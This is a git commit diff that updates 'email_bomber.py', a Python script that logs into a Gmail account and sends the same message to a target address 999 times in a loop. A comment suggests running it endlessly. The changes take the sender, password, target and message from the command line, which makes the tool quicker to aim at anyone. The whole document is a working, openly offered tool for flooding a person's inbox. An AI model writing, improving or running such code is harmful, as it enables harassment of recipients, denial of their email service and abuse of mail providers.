e36171a0c397968455fbfb287292d08735f0876f
ithinkthisisarc <developmentarc773@gmail.com>
2019-07-09 10:20:51 -0400

    Various improvements to email_bomber

--- email_bomber.py
+++ email_bomber.py
@@ -1,23 +1,35 @@
 #!/usr/bin/env python
-#You should set your information
 import smtplib
+import sys
 
-sender = 'your email@gmail.com'
-reciver = 'target email@example.com'
-password = 'yor email account password'
+if len(sys.argv) < 4:
+     print("Usage:\npython email_bomber.py sender@email.com email_pass target@email.com message")
+     sys.exit(0)
+
+sender = sys.argv[1]
+reciver = sys.argv[3]
+password = sys.argv[2]
 subject = 'test email_bomber script'
 header = 'From :{}\n'.format(sender)
 header += 'To :{}\n'.format(reciver)
 header += 'Subject :{}\n'.format(subject)
-message = header + 'This is a email_bomber script with python,enjoy!'
+message = header + sys.argv[4]
+
+server = smtplib.SMTP(host='smtp.gmail.com',port=587)
+server.starttls()
 
 try:
-    for n in range(1,1000): # or you can use from "while true" loop
-        server = smtplib.SMTP(host='smtp.gmail.com',port=587)
-        server.starttls()
-        server.login(sender,password)
-        server.sendmail(from_addr=sender,to_addrs=reciver,msg=message)
-        server.quit()
-        print('{} email sended'.format(n))
+	server.login(sender,password)
+	print(f"Logged in as {sender}")
 except:
-    print('Failed to send email!!!')
+	print("Failed to login...")
+	sys.exit(0)
+
+for n in range(1,1000): # or you can use from "while true" loop
+	try:
+		server.sendmail(from_addr=sender,to_addrs=reciver,msg=message)
+		print("Sent email {}", n)
+	except:
+		print("failed to send email...")
+
+server.quit()
